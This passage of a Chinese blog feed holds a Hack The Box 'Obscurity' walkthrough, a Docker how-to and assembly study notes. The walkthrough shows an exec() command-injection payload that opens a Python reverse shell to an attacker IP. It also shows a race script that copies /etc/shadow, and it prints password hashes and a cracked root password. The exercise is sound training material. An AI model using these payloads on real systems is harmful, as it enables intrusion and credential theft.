        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这里可以先设置一下hosts文件 </p><pre><code>10.10.10.168 obscure.htb</code></pre><p>扫描端口发现开放了 <code>8080</code> 的web端口</p><p>页面提示有一个源码泄露</p><pre><code>Message to server devs: the current source code for the web server is in &#39;SuperSecureServer.py&#39; in the secret development directory</code></pre><p>那我们就需要爆破目录了</p><p>使用 <code>wfuzz</code></p><pre><code class="bash">sudo wfuzz -c -z file,common.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py</code></pre><p><img src="/posts/a0911a0b/1580912401299.png" alt></p><p>得到源码：</p><pre><code class="python">import socketimport threadingfrom datetime import datetimeimport sysimport osimport mimetypesimport urllib.parseimport subprocessrespTemplate = &quot;&quot;&quot;HTTP/1.1 {statusNum} {statusCode}Date: {dateSent}Server: {server}Last-Modified: {modified}Content-Length: {length}Content-Type: {contentType}Connection: {connectionType}{body}&quot;&quot;&quot;DOC_ROOT = &quot;DocRoot&quot;CODES = {&quot;200&quot;: &quot;OK&quot;,         &quot;304&quot;: &quot;NOT MODIFIED&quot;,        &quot;400&quot;: &quot;BAD REQUEST&quot;, &quot;401&quot;: &quot;UNAUTHORIZED&quot;, &quot;403&quot;: &quot;FORBIDDEN&quot;, &quot;404&quot;: &quot;NOT FOUND&quot;,         &quot;500&quot;: &quot;INTERNAL SERVER ERROR&quot;}MIMES = {&quot;txt&quot;: &quot;text/plain&quot;, &quot;css&quot;:&quot;text/css&quot;, &quot;html&quot;:&quot;text/html&quot;, &quot;png&quot;: &quot;image/png&quot;, &quot;jpg&quot;:&quot;image/jpg&quot;,         &quot;ttf&quot;:&quot;application/octet-stream&quot;,&quot;otf&quot;:&quot;application/octet-stream&quot;, &quot;woff&quot;:&quot;font/woff&quot;, &quot;woff2&quot;: &quot;font/woff2&quot;,         &quot;js&quot;:&quot;application/javascript&quot;,&quot;gz&quot;:&quot;application/zip&quot;, &quot;py&quot;:&quot;text/plain&quot;, &quot;map&quot;: &quot;application/octet-stream&quot;}class Response:    def __init__(self, **kwargs):        self.__dict__.update(kwargs)        now = datetime.now()        self.dateSent = self.modified = now.strftime(&quot;%a, %d %b %Y %H:%M:%S&quot;)    def stringResponse(self):        return respTemplate.format(**self.__dict__)class Request:    def __init__(self, request):        self.good = True        try:            request = self.parseRequest(request)            self.method = request[&quot;method&quot;]            self.doc = request[&quot;doc&quot;]            self.vers = request[&quot;vers&quot;]            self.header = request[&quot;header&quot;]            self.body = request[&quot;body&quot;]        except:            self.good = False    def parseRequest(self, request):                req = request.strip(&quot;\r&quot;).split(&quot;\n&quot;)        method,doc,vers = req[0].split(&quot; &quot;)        header = req[1:-3]        body = req[-1]        headerDict = {}        for param in header:            pos = param.find(&quot;: &quot;)            key, val = param[:pos], param[pos+2:]            headerDict.update({key: val})        return {&quot;method&quot;: method, &quot;doc&quot;: doc, &quot;vers&quot;: vers, &quot;header&quot;: headerDict, &quot;body&quot;: body}class Server:    def __init__(self, host, port):            self.host = host        self.port = port        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        self.sock.bind((self.host, self.port))    def listen(self):        self.sock.listen(5)        while True:            client, address = self.sock.accept()            client.settimeout(60)            threading.Thread(target = self.listenToClient,args = (client,address)).start()    def listenToClient(self, client, address):        size = 1024        while True:            try:                data = client.recv(size) # 收到客户端的数据，应该就是数据包                if data:                    # Set the response to echo back the recieved data                     req = Request(data.decode()) # byte转str，返回的req是list                    self.handleRequest(req, client, address)                    client.shutdown()                    client.close()                else:                    raise error(&#39;Client disconnected&#39;)            except:                client.close()                return False    def handleRequest(self, request, conn, address):        if request.good:#            try:                # print(str(request.method) + &quot; &quot; + str(request.doc), end=&#39; &#39;)                # print(&quot;from {0}&quot;.format(address[0]))#            except Exception as e:#                print(e)            document = self.serveDoc(request.doc, DOC_ROOT)            statusNum=document[&quot;status&quot;]        else:            document = self.serveDoc(&quot;/errors/400.html&quot;, DOC_ROOT)            statusNum=&quot;400&quot;        body = document[&quot;body&quot;]        statusCode=CODES[statusNum]        dateSent = &quot;&quot;        server = &quot;BadHTTPServer&quot;        modified = &quot;&quot;        length = len(body)        contentType = document[&quot;mime&quot;] # Try and identify MIME type from string        connectionType = &quot;Closed&quot;        resp = Response(        statusNum=statusNum, statusCode=statusCode,         dateSent = dateSent, server = server,         modified = modified, length = length,         contentType = contentType, connectionType = connectionType,         body = body        )        data = resp.stringResponse()        if not data:            return -1        conn.send(data.encode())        return 0    def serveDoc(self, path, docRoot):        path = urllib.parse.unquote(path)        try:            info = &quot;output = &#39;Document: {}&#39;&quot; # Keep the output for later debug            exec(info.format(path)) # This is how you do string formatting, right?            cwd = os.path.dirname(os.path.realpath(__file__))            docRoot = os.path.join(cwd, docRoot)            if path == &quot;/&quot;:                path = &quot;/index.html&quot;            requested = os.path.join(docRoot, path[1:])            if os.path.isfile(requested):                mime = mimetypes.guess_type(requested)                mime = (mime if mime[0] != None else &quot;text/html&quot;)                mime = MIMES[requested.split(&quot;.&quot;)[-1]]                try:                    with open(requested, &quot;r&quot;) as f:                        data = f.read()                except:                    with open(requested, &quot;rb&quot;) as f:                        data = f.read()                status = &quot;200&quot;            else:                errorPage = os.path.join(docRoot, &quot;errors&quot;, &quot;404.html&quot;)                mime = &quot;text/html&quot;                with open(errorPage, &quot;r&quot;) as f:                    data = f.read().format(path)                status = &quot;404&quot;        except Exception as e:            print(e)            errorPage = os.path.join(docRoot, &quot;errors&quot;, &quot;500.html&quot;)            mime = &quot;text/html&quot;            with open(errorPage, &quot;r&quot;) as f:                data = f.read()            status = &quot;500&quot;        return {&quot;body&quot;: data, &quot;mime&quot;: mime, &quot;status&quot;: status}</code></pre><p>审计源码发现关键点：</p><pre><code class="python">def serveDoc(self, path, docRoot):    path = urllib.parse.unquote(path)    try:        info = &quot;output = &#39;Document: {}&#39;&quot; # Keep the output for later debug        exec(info.format(path)) # This is how you do string formatting, right?        cwd = os.path.dirname(os.path.realpath(__file__))        docRoot = os.path.join(cwd, docRoot)</code></pre><p>大致说一下代码的含义，开启socket监听，接收到http请求，调用 <code>Request</code> 类的 <code>parseRequest</code> 方法做分割，然后调用 <code>handleRequest</code> 处理请求，通过 <code>serveDoc</code> 处理请求的文档</p><p><code>exec</code> 函数处存在命令注入</p><pre><code class="python">In [33]: path = &quot;/&#39;;os.system(&#39;whoami&#39;)#&quot;In [34]: exec(info.format(path))laptop-ubiep4k5\zz</code></pre><p>然后就可以通过python反弹shell了</p><pre><code class="python">import requestsimport urllibimport osurl = &#39;http://10.10.10.168:8080/&#39;path=&#39;5\&#39;&#39;+&#39;\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.146&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])\na=\&#39;&#39;payload = urllib.parse.quote(path)print(&quot;payload&quot;)print(url+payload)r= requests.get(url+payload)print(r.headers)print(r.text)</code></pre><p>反弹到shell之后继续进行信息收集：</p><p><code>check.txt</code>，大致含义就是加密了这个文件，加密的结果是 <code>out.txt</code></p><pre><code class="bash">www-data@obscure:/home/robert$ cat check.txtcat check.txtEncrypting this file with your key should result in out.txt, make sure your key is correct!</code></pre><p><code>out.txt</code>, 这个就是加密的结果</p><pre><code>www-data@obscure:/home/robert$ xxd out.txtxxd out.txt00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................000000b0: c38c c397 c289 c281 76                   ........v</code></pre><p><code>passwordreminder.txt</code> 又是一个加密后的文件</p><pre><code>www-data@obscure:/home/robert$ hd passwordreminder.txthd passwordreminder.txt00000000  c2 b4 c3 91 c3 88 c3 8c  c3 89 c3 a0 c3 99 c3 81  |................|00000010  c3 91 c3 a9 c2 af c2 b7  c2 bf 6b                 |..........k|0000001b</code></pre><p> <code>BetterSSH.py</code> (这个之后提权会用到)</p><pre><code class="python">www-data@obscure:/home/robert/BetterSSH$ cat BetterSSH.pycat BetterSSH.pyimport sysimport random, stringimport osimport timeimport cryptimport tracebackimport subprocesspath = &#39;&#39;.join(random.choices(string.ascii_letters + string.digits, k=8))session = {&quot;user&quot;: &quot;&quot;, &quot;authenticated&quot;: 0}try:    session[&#39;user&#39;] = input(&quot;Enter username: &quot;)    passW = input(&quot;Enter password: &quot;)    with open(&#39;/etc/shadow&#39;, &#39;r&#39;) as f:        data = f.readlines()    data = [(p.split(&quot;:&quot;) if &quot;$&quot; in p else None) for p in data]    passwords = []    for x in data:        if not x == None:            passwords.append(x)    passwordFile = &#39;\n&#39;.join([&#39;\n&#39;.join(p) for p in passwords])    with open(&#39;/tmp/SSH/&#39;+path, &#39;w&#39;) as f:        f.write(passwordFile)    time.sleep(.1)    salt = &quot;&quot;    realPass = &quot;&quot;    for p in passwords:        if p[0] == session[&#39;user&#39;]:            salt, realPass = p[1].split(&#39;$&#39;)[2:]            break    if salt == &quot;&quot;:        print(&quot;Invalid user&quot;)        os.remove(&#39;/tmp/SSH/&#39;+path)        sys.exit(0)    salt = &#39;$6$&#39;+salt+&#39;$&#39;    realPass = salt + realPass    hash = crypt.crypt(passW, salt)    if hash == realPass:        print(&quot;Authed!&quot;)        session[&#39;authenticated&#39;] = 1    else:        print(&quot;Incorrect pass&quot;)        os.remove(&#39;/tmp/SSH/&#39;+path)        sys.exit(0)    os.remove(os.path.join(&#39;/tmp/SSH/&#39;,path))except Exception as e:    traceback.print_exc()    sys.exit(0)if session[&#39;authenticated&#39;] == 1:    while True:        command = input(session[&#39;user&#39;] + &quot;@Obscure$ &quot;)        cmd = [&#39;sudo&#39;, &#39;-u&#39;,  session[&#39;user&#39;]]        cmd.extend(command.split(&quot; &quot;))        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)        o,e = proc.communicate()        print(&#39;Output: &#39; + o.decode(&#39;ascii&#39;))        print(&#39;Error: &#39;  + e.decode(&#39;ascii&#39;)) if len(e.decode(&#39;ascii&#39;)) &gt; 0 else print(&#39;&#39;)</code></pre><p><code>SuperSecureCrypt.py</code></p><pre><code class="python">www-data@obscure:/home/robert$ cat SuperSecureCrypt.pycat SuperSecureCrypt.pyimport sysimport argparsedef encrypt(text, key):    keylen = len(key)    keyPos = 0    encrypted = &quot;&quot;    for x in text:        keyChr = key[keyPos]        newChr = ord(x)        newChr = chr((newChr + ord(keyChr)) % 255)        encrypted += newChr        keyPos += 1        keyPos = keyPos % keylen    return encrypteddef decrypt(text, key):    keylen = len(key)    keyPos = 0    decrypted = &quot;&quot;    for x in text:        keyChr = key[keyPos]        newChr = ord(x)        newChr = chr((newChr - ord(keyChr)) % 255)        decrypted += newChr        keyPos += 1        keyPos = keyPos % keylen    return decryptedparser = argparse.ArgumentParser(description=&#39;Encrypt with 0bscura\&#39;s encryption algorithm&#39;)parser.add_argument(&#39;-i&#39;,                    metavar=&#39;InFile&#39;,                    type=str,                    help=&#39;The file to read&#39;,                    required=False)parser.add_argument(&#39;-o&#39;,                    metavar=&#39;OutFile&#39;,                    type=str,                    help=&#39;Where to output the encrypted/decrypted file&#39;,                    required=False)parser.add_argument(&#39;-k&#39;,                    metavar=&#39;Key&#39;,                    type=str,                    help=&#39;Key to use&#39;,                    required=False)parser.add_argument(&#39;-d&#39;, action=&#39;store_true&#39;, help=&#39;Decrypt mode&#39;)args = parser.parse_args()banner = &quot;################################\n&quot;banner+= &quot;#           BEGINNING          #\n&quot;banner+= &quot;#    SUPER SECURE ENCRYPTOR    #\n&quot;banner+= &quot;################################\n&quot;banner += &quot;  ############################\n&quot;banner += &quot;  #        FILE MODE         #\n&quot;banner += &quot;  ############################&quot;print(banner)if args.o == None or args.k == None or args.i == None:    print(&quot;Missing args&quot;)else:    if args.d:        print(&quot;Opening file {0}...&quot;.format(args.i))        with open(args.i, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:            data = f.read()        print(&quot;Decrypting...&quot;)        decrypted = decrypt(data, args.k)        print(&quot;Writing to {0}...&quot;.format(args.o))        with open(args.o, &#39;w&#39;, encoding=&#39;UTF-8&#39;) as f:            f.write(decrypted)    else:        print(&quot;Opening file {0}...&quot;.format(args.i))        with open(args.i, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:            data = f.read()        print(&quot;Encrypting...&quot;)        encrypted = encrypt(data, args.k)        print(&quot;Writing to {0}...&quot;.format(args.o))        with open(args.o, &#39;w&#39;, encoding=&#39;UTF-8&#39;) as f:            f.write(encrypted)</code></pre><p>从加密的脚本中可以知道关键的加密逻辑：</p><pre><code class="python">def encrypt(text, key):    keylen = len(key)    keyPos = 0    encrypted = &quot;&quot;    for x in text:        keyChr = key[keyPos]        newChr = ord(x)        newChr = chr((newChr + ord(keyChr)) % 255)        encrypted += newChr        keyPos += 1        keyPos = keyPos % keylen    return encrypted</code></pre><p>所以我们只需要爆破密钥了</p><p>爆破脚本</p><pre><code class="python">import stringwith open(&#39;check.txt&#39;,&#39;r&#39;,encoding=&#39;UTF-8&#39;) as f:    ta = f.read()key=&#39;&#39;with open(&#39;out.txt&#39;,&#39;r&#39;,encoding=&#39;UTF-8&#39;) as f:    data = f.read()    for x in range(len(data)):        for i in range(255):            ch = chr((ord(data[x])-i)%255)            if ch == ta[x]:                key +=chr(i)                break    print(key)</code></pre><p>得到密钥</p><pre><code>alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal</code></pre><blockquote><p>这里我遇到了一个难点，不知道如何将文件copy出来，本来我是可以通过 <code>python3 -m http.server 8001</code> 在靶机上开一个端口的，但是不知道为什么不成功。所以我这里是通过xxd来复原的</p></blockquote><p>将 xxd 得到的结果复制出来，然后我们可以通过<code>xxd -r</code> 反向 <code>dump</code> 出结果</p><pre><code>robert@obscure:~$ xxd out.txt00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................000000b0: c38c c397 c289 c281 76                   ........v</code></pre><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>得到密钥之后我们再解密即可</p><pre><code class="bash">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/key.txt -k alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal -dk alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal -d#################################           BEGINNING          ##    SUPER SECURE ENCRYPTOR    #################################  ############################  #        FILE MODE         #  ############################Opening file passwordreminder.txt...Decrypting...Writing to /tmp/key.txt...www-data@obscure:/home/robert$ cat /tmp/key.txtcat /tmp/key.txtSecThruObsFTW</code></pre><p>成功登陆</p><p>拿到 flag</p><pre><code class="bash">robert@obscure:~$ lsBetterSSH  check.txt  out.txt  passwordreminder.txt  SuperSecureCrypt.py  user.txtrobert@obscure:~$ cat user.txte4493782066b55fe2755708736ada2d7</code></pre><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>robert用户登陆之后，<code>sudo -l</code> 查看能够执行的root命令，发现能够以root身份执行 <code>BetterSSH.py</code></p><pre><code class="bash">robert@obscure:~$ sudo -lMatching Defaults entries for robert on obscure:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser robert may run the following commands on obscure:    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code></pre><p>审计源码发现关键点：</p><pre><code class="python">with open(&#39;/etc/shadow&#39;, &#39;r&#39;) as f:    data = f.readlines()data = [(p.split(&quot;:&quot;) if &quot;$&quot; in p else None) for p in data]passwords = []for x in data:    if not x == None:        passwords.append(x)passwordFile = &#39;\n&#39;.join([&#39;\n&#39;.join(p) for p in passwords])with open(&#39;/tmp/SSH/&#39;+path, &#39;w&#39;) as f:    f.write(passwordFile)</code></pre><p>程序会将 <code>/etc/shadow</code> 写入到 <code>/tmp/SSH</code> 的某个随机的目录中，于是想到我们只需要写个死循环不断地复制该目录下的文件即可</p><pre><code class="python">import shutilimport oswhile True:    files = os.listdir(&quot;./SSH&quot;)    for file in files:        shutil.copy(os.path.join(&quot;./SSH&quot;, file), &quot;./flag&quot;);</code></pre><p>或者使用 <code>shell</code> 脚本</p><pre><code class="shell">robert@obscure:/tmp$ cat scandir.sh#/bin/bashpath=$1while (true); do    file=$(ls $path)    if [ &quot;${file}&quot; == &quot;&quot; ]    then        continue    else        mv $path/$file ./        break    fidone</code></pre><p>然后我们执行就会发现 <code>flag</code> 目录中存在文件</p><pre><code class="python">robert@obscure:/tmp/flag$ lsTdrs5183robert@obscure:/tmp/flag$ cat Tdrs5183root$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1182260999997robert$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/181630999997</code></pre><p>john 解密得到 <code>mercedes</code></p><pre><code class="bash">robert@obscure:/tmp$ sudo python3 ~/BetterSSH/BetterSSH.pyEnter username: rootEnter password: mercedesAuthed!root@Obscure$ lsOutput: SSHsystemd-private-da1116f9cf3e43be847886abe5bdf51e-systemd-resolved.service-zZTUtHsystemd-private-da1116f9cf3e43be847886abe5bdf51e-systemd-timesyncd.service-AkWIWivmware-root_574-2990744286root@Obscure$ cat /root/root.txtOutput: 512fd4429f33a113a44d5acde23609e3</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做完后感觉并不是很难，但是还是发现自己在代码的能力偏弱，写个脚本要花很长的时间</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker基本使用指南</title>
      <link href="/posts/70b2e753/"/>
      <url>/posts/70b2e753/</url>
      
        <content type="html"><![CDATA[<h2 id="docker-遇到的坑"><a href="#docker-遇到的坑" class="headerlink" title="docker 遇到的坑"></a>docker 遇到的坑</h2><p>运行的时候不能直接用 <code>./</code> 指定当前的文件，需要 <code>$PWD</code></p><p>一次性清理所有的已经关闭的容器<br> <code>docker ps -a | grep Exit | cut -d &#39; &#39; -f 1 | xargs docker rm</code></p><p><code>:ro</code> 表示只读</p><p>访问受到限制</p><p><img src="/posts/70b2e753/1580653426115.png" alt></p><p>此时目录下的文件权限</p><p><img src="/posts/70b2e753/1580653436093.png" alt></p><p>重新运行了一下</p><p><img src="/posts/70b2e753/1580653447982.png" alt></p><p>看来是文件权限的问题，也就是说docker会默认将文件权限直接复制过来，由于我之前的那个用户是pxy，而docker环境中并没有这个用户，导致就变成了1000</p><h2 id="移除镜像"><a href="#移除镜像" class="headerlink" title="移除镜像"></a>移除镜像</h2><pre><code>docker image rm xxxx</code></pre><h2 id="–link-参数"><a href="#–link-参数" class="headerlink" title="–link 参数"></a>–link 参数</h2><p>自动添加了环境变量</p><p><img src="/posts/70b2e753/1580653523204.png" alt></p><p><img src="/posts/70b2e753/1580653527989.png" alt></p><p>还有这个</p><p><img src="/posts/70b2e753/1580653537486.png" alt></p><p><code>/etc/hosts</code> 也会更新</p><p><img src="/posts/70b2e753/1580653546884.png" alt></p><p>神奇。。<br>运行nginx和php-fpm<br><code>docker run --name  myphp-fpm -v $PWD/www:/www  -d php:5.6-fpm</code></p><pre><code>$ docker run --name runoob-php-nginx -p 8083:80 -d \               -v $PWD/www:/usr/share/nginx/html:ro \    -v $PWD/conf/conf.d:/etc/nginx/conf.d:ro \    --link myphp-fpm:php \ ----&gt; 注意需要取别名nginx</code></pre><p>如果不取别名的话直接闪退，别名可以理解成对应的主机地址</p><p><img src="/posts/70b2e753/1580653561167.png" alt></p><p>然后开始折腾docker-compose.yml</p><pre><code class="yaml">version: &#39;2&#39;services:  nginx:    image: nginx:latest    volumes:      - ./conf/conf.d:/etc/nginx/conf.d      - ./www:/usr/share/nginx/html    depends_on:      - myphp-fpm    links:      - myphp-fpm:php    ports:      - &quot;8083:80&quot;  myphp-fpm:    image: php:5.6-fpm    volumes:      - ./www:/www</code></pre><p>试了多次，<code>links</code> 需要取别名</p><p>同时文件的权限也很重要，不然会出现无法读取flag的情况</p><h2 id="Dockerfile-编写"><a href="#Dockerfile-编写" class="headerlink" title="Dockerfile 编写"></a>Dockerfile 编写</h2><p><code>WORKDIR</code> 指定工作目录，这样就能够在执行一些shell命令的时候不需要指明路径了</p><h2 id="docker无法运行-mysql容器"><a href="#docker无法运行-mysql容器" class="headerlink" title="docker无法运行 mysql容器"></a>docker无法运行 mysql容器</h2><p>这是由于我偷懒只在本机安装了 mysql 得客户端，没有安装服务端，这也是很神奇了</p><h2 id="docker运行phpmyadmin"><a href="#docker运行phpmyadmin" class="headerlink" title="docker运行phpmyadmin"></a>docker运行phpmyadmin</h2><p>我发现并不需要 nginx ,当然如果有nginx的情况下可以做到反向代理比较好一点</p><pre><code class="yaml">version: &quot;3&quot;services:  phpmyadmin:    image: phpmyadmin/phpmyadmin    ports:       - 8081:80    links:      - mysql:db  mysql:    image: mysql:5.6    environment:       - MYSQL_ROOT_PASSWORD=123456</code></pre><h2 id="nginx结合mysql"><a href="#nginx结合mysql" class="headerlink" title="nginx结合mysql"></a>nginx结合mysql</h2><pre><code class="yaml">version: &#39;2&#39;services:  nginx:    image: nginx:latest    volumes:      - ./conf/conf.d:/etc/nginx/conf.d      - ./www:/usr/share/nginx/html    depends_on:      - myphp-fpm    links:      - myphp-fpm:php    ports:      - &quot;8083:80&quot;  myphp-fpm:    image: php/kuozhan    volumes:      - ./www:/www    links:      - mysql:db  mysql:    image: mysql:5.6    restart: always    environment:      - MYSQL_ROOT_PASSWORD=123456</code></pre><h2 id="nginx配置学习"><a href="#nginx配置学习" class="headerlink" title="nginx配置学习"></a>nginx配置学习</h2><p>nginx的配置文件以后再单独写，这里先学一点</p><p>怎么理解 nginx和php-fpm的关系呢</p><p>我在配置docker环境的时候意识到nginx和php两个镜像是相互独立的，首先运行php-fpm镜像，将其内部的 <code>/www</code> 映射到我外部的 <code>./www</code> 目录中，然后再运行 nginx 镜像，将其 <code>/usr/share/nginx/html</code> 映射到 <code>./www</code> 目录，同时还需要做两件事</p><ol><li>配置nginx，指定解析的脚本目在 <code>/www</code> 目录中</li><li>连接php-fpm容器，需要将解析到 php 这个域名才行</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土二</title>
      <link href="/posts/6cc1a5d6/"/>
      <url>/posts/6cc1a5d6/</url>
      
        <content type="html"><![CDATA[<h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p>intel的CPU是采用的小端法来存储数据</p><p>在查看内存的时候，我更愿意按照这样的方式，我认为0号应该代表第一根横线，也就是认为是第一个存储单元的开始，也就是说我觉得 0~1 这个单元存放着 20H，因为这样在后续分析栈的时候比较有用</p><p><img src="/posts/6cc1a5d6/1580653048875.png" alt></p><p>字单元：存放一个字节型数据的内存单元，也就是两个字节16位，高位放高地址，低位放低地址</p><h2 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h2><p>数据段寄存器默认为 ds</p><p>所以我们要操作内存数据的时候只需要指定偏移即可</p><p>CPU不支持直接将数据送入到段寄存器，需要有寄存器作为中转</p><pre><code class="x86asm">mov bx,1000Hmov ds,bxmov [0],al</code></pre><p>上述代码的含义：先设置ds寄存器为1000H，然后将al中的数据送往这个内存单元(所以我们要移动数据到内存的时候是需要先设置数据段的基地址的)</p><h2 id="mov指令"><a href="#mov指令" class="headerlink" title="mov指令"></a>mov指令</h2><p>mov 段寄存器，寄存器<br>mov 寄存器，段寄存器<br>mov 内存单元，寄存器<br>mov 寄存器，内存单元<br>mov 段寄存器，内存单元<br>mov 内存单元，段寄存器</p><p>但是 add 指令不能直接操作段寄存器和寄存器</p><p><img src="/posts/6cc1a5d6/1580653072050.png" alt></p><h2 id="数据段-1"><a href="#数据段-1" class="headerlink" title="数据段"></a>数据段</h2><p><img src="/posts/6cc1a5d6/1580653090896.png" alt></p><p>AX=0，BX=0</p><pre><code>mov ax,1mov ds,axmov ax,[0000] ;AX = 2662Hmov bx,[0001] ;BX = E626Hmov ax,bx     ;AX = 2662Hmov ax,[0000] ;AX = 2662Hmov bx,[0002] ;BX = D6E6Hadd ax,bx     ;AX = FD48Hadd ax,[0004] ;AX = 2ECC+FD48 = 2C14mov ax,0      ;AX = 0mov al,[0002] ;AX = E6Hmov bx,0      ;BX = 0mov bl,[000c] ;BX = 00Hadd al,bl     ;AX = E6H</code></pre><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>任意时刻 <code>SS:SP</code> 指向栈顶元素</p><p>PUSH 操作的过程</p><ol><li>SP = SP -2</li><li>SS:SP 指向新的地址</li><li>然后将数据送入到 <code>SS:SP</code> 指向的地址中</li></ol><p>然后就涉及到怎么计算 <code>SP</code> 的问题了</p><blockquote><p>只需要记住初始状态栈中没有元素，并且 SP+2 是栈中的第一个存储单元</p></blockquote><p><img src="/posts/6cc1a5d6/1580653127959.png" alt></p><p>POP 指令</p><ol><li>将SS:SP 指向的内存单元数据送入到寄存器中，或者是某个内存单元中</li><li>SP = SP + 2</li></ol><p>PUSH和POP的指令形式</p><pre><code>push 寄存器pop 寄存器push 段寄存器pop 段寄存器push 内存单元pop 内存单元</code></pre><p>利用栈可以达到交换数据的目的</p><pre><code>mov ax,1000Hmov ss,axmov sp,0010Hmov ax,001AHmov bx,001BHpush axpush bxpop axpop bx</code></pre><h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p><img src="/posts/6cc1a5d6/1580653176153.png" alt></p><pre><code class="x86asm">mov ax,1000Hmov ds,axmov ax,2000mov ss,axmov sp,0010Hpush[0]push[2]push[4]push[6]push[8]push[A]push[C]push[E]</code></pre><p>现在 1000H~100FH 的内存内容为：</p><p><img src="/posts/6cc1a5d6/1580653193364.png" alt></p><p>本着节约内存的想法</p><p><img src="/posts/6cc1a5d6/1580653210499.png" alt></p><p>然而执行完之后的结果</p><p><img src="/posts/6cc1a5d6/1580653219446.png" alt></p><p>看来节约内存不是件好事，于是我重新把 3000:0 作为代码段</p><p><img src="/posts/6cc1a5d6/1580653228997.png" alt></p><p>这回成功了</p><p><img src="/posts/6cc1a5d6/1580653238046.png" alt></p><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><p><img src="/posts/6cc1a5d6/1580653248493.png" alt></p><pre><code class="x86asm">mov ax,2000Hmov ds,axmov ax,1000Hmov ss,axmov sp,0pop [E]pop [C]pop [A]pop [8]pop [6]pop [4]pop [2]pop [0]</code></pre><p>同样的，我先设置 1000:0 处的值</p><p><img src="/posts/6cc1a5d6/1580653258074.png" alt></p><p>将指令书写到内存中，也就是设置 3000:0 为代码段</p><p><img src="/posts/6cc1a5d6/1580653266322.png" alt></p><p>在实验的时候，前面一部分数据是可以正常复制的，但是后面就出问题了</p><p><img src="/posts/6cc1a5d6/1580653275496.png" alt></p><p>暂时没想清楚</p><h2 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h2><p>遇到的问题</p><p>输入指令：</p><p><img src="/posts/6cc1a5d6/1580653286041.png" alt></p><p>但是在执行的时候：</p><p><img src="/posts/6cc1a5d6/1580653293057.png" alt></p><p>这是之后要研究的内容；中断机制<br>Debug的T命令在修改寄存器SS的指令时，下一条指令也会紧接着执行</p><pre><code class="x86asm">mov ax,ffffmov ds,axmov ax,2200mov ss,axmov sp,0100mov ax,[0]     ;ax=C0EAHadd ax,[2]     ;ax=C0FCHmov bx,[4]     ;bx=30Fadd bx,[6]     ;bx=6021Hpush ax        ;sp=FEH,修改的内存单元地址是220FEH,内容为C0FCHpush bx        